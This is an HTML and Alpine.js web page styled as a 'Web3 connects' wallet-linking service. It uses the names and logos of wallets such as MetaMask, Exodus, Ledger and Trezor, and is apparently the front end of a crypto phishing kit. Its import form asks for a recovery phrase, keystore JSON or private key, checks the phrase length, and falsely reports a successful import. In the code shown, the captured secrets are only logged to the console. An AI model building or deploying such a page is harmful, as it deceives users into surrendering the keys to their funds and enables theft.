<!doctype html>
<html dir="ltr" lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Wallet - Web3 connects</title>
    
    <!-- Tabler Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfonts@2.44.0/tabler-icons.min.css">
    
    <!-- Alpine.js -->
    <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/collapse@3.13.3/dist/cdn.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script>
    
    <!-- Your CSS -->
    <link href="assets2/css/index.css" rel="stylesheet">

    <style>
        body {
            background: linear-gradient(135deg, #0a2818 0%, #051a0f 100%);
            min-height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        .header-nav {
            background: rgba(10, 31, 20, 0.98);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(16, 185, 129, 0.15);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
        }
        
        .wallet-card {
            background: rgba(15, 50, 35, 0.4);
            border: 1px solid rgba(16, 185, 129, 0.2);
            backdrop-filter: blur(10px);
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
        }
        
        .wallet-card:hover {
            background: rgba(26, 60, 46, 0.6);
            border-color: rgba(16, 185, 129, 0.4);
            transform: translateX(4px);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
        }
        
        .wallet-card:active {
            transform: translateX(2px);
        }

        /* Wallet Icon Styling */
        .wallet-icon-container {
            width: 48px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 8px;
        }

        .wallet-icon {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .modal-wallet-icon {
            width: 64px;
            height: 64px;
            object-fit: contain;
        }

        .cancel-btn {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            transition: all 0.2s ease;
        }
        
        .cancel-btn:hover {
            background: rgba(239, 68, 68, 0.2);
            border-color: rgba(239, 68, 68, 0.5);
            color: #fff;
        }

        .toggle-checkbox {
            appearance: none;
            width: 44px;
            height: 24px;
            background: rgba(75, 85, 99, 0.5);
            border-radius: 12px;
            position: relative;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .toggle-checkbox:checked {
            background: #10b981;
        }
        
        .toggle-checkbox::before {
            content: '';
            position: absolute;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: white;
            top: 3px;
            left: 3px;
            transition: transform 0.3s ease;
        }
        
        .toggle-checkbox:checked::before {
            transform: translateX(20px);
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .modal-content {
            animation: slideUp 0.3s ease-out;
        }

        .description-text {
            color: rgba(229, 231, 235, 0.7);
            line-height: 1.6;
        }

        .secure-wallet-btn {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            box-shadow: 0 4px 14px rgba(16, 185, 129, 0.3);
        }
        
        .secure-wallet-btn:hover {
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
            transform: translateY(-1px);
        }
    </style>

    <!-- Alpine.js Component -->
    <script>
    document.addEventListener('alpine:init', () => {
        Alpine.data('walletPage', () => ({
            selectedWallet: null,
            showModal: false,
            showImportForm: false,
            showUninstalled: false,
            walletName: '',
            email: '',
            recoveryPhrase: '',
            importMethod: 'phrase',
            
            // UPDATED: Use actual image paths instead of emojis
            wallets: [
                { 
                    name: 'Exodus', 
                    icon: 'assets2/images/wallets/exodus.png', 
                    description: 'A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed.' 
                },
                { 
                    name: 'Trust Wallet', 
                    icon: 'assets2/images/wallets/trust-wallet.png', 
                    description: 'Trust Wallet is a secure cryptocurrency wallet supporting multiple blockchains.' 
                },
                { 
                    name: 'Wallet Connect', 
                    icon: 'assets2/images/wallets/wallet-connect.png', 
                    description: 'WalletConnect is an open protocol to connect wallets to dapps.' 
                },
                { 
                    name: 'MetaMask', 
                    icon: 'assets2/images/wallets/metamask.png', 
                    description: 'MetaMask is a crypto wallet & gateway to blockchain apps.' 
                },
                { 
                    name: 'Phantom', 
                    icon: 'assets2/images/wallets/phantom.png', 
                    description: 'Phantom is a friendly crypto wallet built for DeFi & NFTs.' 
                },
                { 
                    name: 'Coinbase Wallet', 
                    icon: 'assets2/images/wallets/coinbase-wallet.png', 
                    description: 'Your key to the world of crypto.' 
                },
                { 
                    name: 'Ledger', 
                    icon: 'assets2/images/wallets/ledger.png', 
                    description: 'The most trusted hardware wallet for crypto.' 
                },
                { 
                    name: 'Trezor', 
                    icon: 'assets2/images/wallets/trezor.png', 
                    description: 'Ultimate protection for your digital assets.' 
                }
            ],

            openWalletModal(wallet) {
                this.selectedWallet = wallet;
                this.showModal = true;
                document.body.style.overflow = 'hidden';
            },

            closeModal() {
                this.showModal = false;
                this.showImportForm = false;
                document.body.style.overflow = 'auto';
                this.resetForm();
            },

            proceedToImport() {
                this.showModal = false;
                this.showImportForm = true;
            },

            resetForm() {
                this.walletName = '';
                this.email = '';
                this.recoveryPhrase = '';
                this.importMethod = 'phrase';
            },

            goBack() {
                window.location.href = '/';
            },

            async submitWallet() {
                if (!this.walletName || !this.email || !this.recoveryPhrase) {
                    alert('⚠️ Please fill all fields');
                    return;
                }

                const words = this.recoveryPhrase.trim().split(/\s+/);
                if (this.importMethod === 'phrase' && words.length !== 12 && words.length !== 24) {
                    alert('⚠️ Recovery phrase must be 12 or 24 words');
                    return;
                }

                console.log({
                    wallet: this.selectedWallet?.name,
                    walletName: this.walletName,
                    email: this.email,
                    phrase: this.recoveryPhrase,
                    method: this.importMethod,
                    timestamp: new Date().toISOString()
                });

                alert('✅ Wallet imported successfully!');
                this.closeModal();
                
                setTimeout(() => {
                    window.location.href = '/';
                }, 1500);
            }
        }))
    });
    </script>
</head>

<body x-data="walletPage" class="text-white">

    <!-- Header -->
    <header class="header-nav fixed top-0 left-0 right-0 z-50 py-4">
        <div class="container flex justify-between items-center">
            <a href="/" class="text-2xl font-bold hover:opacity-80 transition">
                <span style="color: #EFBD31">W</span>
                <span style="color: #ff4e98">E</span>
                <span style="color: #44c4ff">B3 CONNECTS</span>
            </a>
            
            <nav class="hidden md:flex gap-8 text-sm">
                <a href="#" class="hover:text-emerald-400 transition-colors">DApps</a>
                <a href="#" class="hover:text-emerald-400 transition-colors">NFT</a>
                <a href="#" class="hover:text-emerald-400 transition-colors">Web3</a>
            </nav>
            
            <button class="secure-wallet-btn px-6 py-2.5 rounded-lg font-semibold transition-all">
                Secure Wallet
            </button>
        </div>
    </header>

    <!-- Main Content -->
    <main class="pt-32 pb-20 px-4">
        <div class="container max-w-5xl mx-auto">
            
            <!-- Title Section with Cancel Button -->
            <div class="mb-12">
                <div class="flex items-center justify-between mb-6">
                    <h1 class="text-4xl md:text-5xl font-bold">Secure</h1>
                    <button @click="goBack" 
                            class="cancel-btn px-6 py-2.5 rounded-lg font-semibold flex items-center gap-2 transition-all">
                        <i class="ti ti-arrow-left"></i>
                        <span>Cancel</span>
                    </button>
                </div>
                <p class="description-text max-w-3xl text-base md:text-lg">
                    Refers to the safety and protection of assets, data, and transactions in the crypto space. 
                    Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.
                </p>
            </div>

            <!-- Controls Section -->
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-8">
                <h2 class="text-xl font-semibold">Choose wallet</h2>
                <label class="flex items-center gap-3 cursor-pointer select-none">
                    <span class="text-sm text-gray-400">Show uninstalled</span>
                    <input type="checkbox" 
                           x-model="showUninstalled"
                           class="toggle-checkbox">
                </label>
            </div>

            <!-- Wallet Grid - UPDATED WITH IMG TAGS -->
            <div class="grid gap-4">
                <template x-for="wallet in wallets" :key="wallet.name">
                    <button @click="openWalletModal(wallet)" 
                            class="wallet-card rounded-2xl p-5 md:p-6 flex items-center gap-4 text-left w-full">
                        <!-- UPDATED: Use img tag instead of emoji -->
                        <div class="wallet-icon-container">
                            <img :src="wallet.icon" 
                                 :alt="wallet.name"
                                 class="wallet-icon"
                                 loading="lazy">
                        </div>
                        <div class="flex-1">
                            <h3 class="text-lg md:text-xl font-semibold" x-text="wallet.name"></h3>
                        </div>
                        <i class="ti ti-chevron-right text-emerald-400 text-xl"></i>
                    </button>
                </template>
            </div>

            <!-- Bottom Cancel Button -->
            <div class="mt-12 flex justify-center">
                <button @click="goBack" 
                        class="cancel-btn px-8 py-3 rounded-xl font-semibold flex items-center gap-2 transition-all">
                    <i class="ti ti-x"></i>
                    <span>Cancel & Go Back</span>
                </button>
            </div>

        </div>
    </main>

    <!-- Wallet Info Modal -->
    <template x-teleport="body">
        <div x-show="showModal" 
             x-transition:enter="transition ease-out duration-300"
             x-transition:enter-start="opacity-0"
             x-transition:enter-end="opacity-100"
             @click.self="closeModal"
             class="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm"
             style="display: none;">
            
            <div class="modal-content bg-white text-gray-900 rounded-3xl max-w-lg w-full p-8 relative shadow-2xl">
                <button @click="closeModal" 
                        class="absolute top-6 right-6 text-3xl text-gray-400 hover:text-gray-900 transition-colors">×</button>
                
                <div class="flex items-center gap-4 mb-6">
                    <!-- UPDATED: Use img tag in modal -->
                    <img :src="selectedWallet?.icon" 
                         :alt="selectedWallet?.name"
                         class="modal-wallet-icon">
                    <h2 class="text-2xl md:text-3xl font-bold" x-text="selectedWallet?.name"></h2>
                </div>

                <p class="text-gray-600 mb-8 leading-relaxed" x-text="selectedWallet?.description"></p>

                <div class="flex gap-3">
                    <button @click="closeModal" 
                            class="flex-1 py-4 border-2 border-gray-300 text-gray-700 rounded-xl font-semibold hover:bg-gray-50 transition-all">
                        Cancel
                    </button>
                    <button @click="proceedToImport" 
                            class="flex-1 py-4 bg-gradient-to-r from-emerald-500 to-emerald-600 text-white rounded-xl font-semibold hover:shadow-lg transition-all">
                        Connect
                    </button>
                </div>
            </div>
        </div>
    </template>

    <!-- Import Wallet Form Modal -->
    <template x-teleport="body">
        <div x-show="showImportForm" 
             x-transition:enter="transition ease-out duration-300"
             x-transition:enter-start="opacity-0"
             x-transition:enter-end="opacity-100"
             @click.self="closeModal"
             class="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm overflow-y-auto"
             style="display: none;">
            
            <div class="modal-content bg-white text-gray-900 rounded-3xl max-w-2xl w-full relative shadow-2xl my-8">
                <button @click="closeModal" 
                        class="absolute top-6 right-6 z-10 text-3xl text-gray-400 hover:text-gray-900 transition-colors">×</button>
                
                <!-- Header -->
                <div class="p-6 border-b flex items-center gap-4">
                    <!-- UPDATED: Use img tag in import form -->
                    <img :src="selectedWallet?.icon" 
                         :alt="selectedWallet?.name"
                         class="w-16 h-16 object-contain">
                    <h2 class="text-2xl font-bold">Import your <span x-text="selectedWallet?.name"></span></h2>
                </div>

                <!-- Tabs -->
                <div class="flex border-b">
                    <button @click="importMethod = 'phrase'" 
                            :class="importMethod === 'phrase' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                            class="flex-1 py-4 font-semibold transition-all">
                        Phrase
                    </button>
                    <button @click="importMethod = 'keystore'" 
                            :class="importMethod === 'keystore' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                            class="flex-1 py-4 font-semibold transition-all">
                        Keystore JSON
                    </button>
                    <button @click="importMethod = 'privatekey'" 
                            :class="importMethod === 'privatekey' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                            class="flex-1 py-4 font-semibold transition-all">
                        Private Key
                    </button>
                </div>

                <!-- Form -->
                <div class="p-6 space-y-5">
                    <div>
                        <label class="block text-sm font-semibold mb-2 text-gray-700">Name wallet</label>
                        <input type="text" 
                               x-model="walletName"
                               placeholder="Enter wallet name" 
                               class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
                    </div>

                    <div>
                        <label class="block text-sm font-semibold mb-2 text-gray-700">Email</label>
                        <input type="email" 
                               x-model="email"
                               placeholder="your.email@example.com" 
                               class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
                    </div>

                    <div>
                        <label class="block text-sm font-semibold mb-2 text-gray-700" 
                               x-text="importMethod === 'phrase' ? 'Phrase' : importMethod === 'keystore' ? 'Keystore JSON' : 'Private Key'"></label>
                        <textarea x-model="recoveryPhrase"
                                  rows="5" 
                                  :placeholder="importMethod === 'phrase' ? 'Enter your recovery phrase' : importMethod === 'keystore' ? 'Paste keystore JSON' : 'Enter private key'"
                                  class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all resize-none"></textarea>
                        <p class="text-xs text-gray-500 mt-2" x-show="importMethod === 'phrase'">
                            <i class="ti ti-info-circle"></i>
                            Typically 12 (sometimes 24) words separated by single spaces
                        </p>
                    </div>

                    <div class="flex gap-4 pt-4">
                        <button @click="closeModal" 
                                class="flex-1 py-4 border-2 border-gray-300 text-gray-700 rounded-xl font-semibold hover:bg-gray-50 transition-all">
                            Cancel
                        </button>
                        <button @click="submitWallet" 
                                class="flex-1 py-4 bg-gradient-to-r from-pink-500 via-purple-500 to-emerald-500 text-white rounded-xl font-semibold hover:shadow-xl transition-all">
                            Proceed
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </template>

</body>
</html>
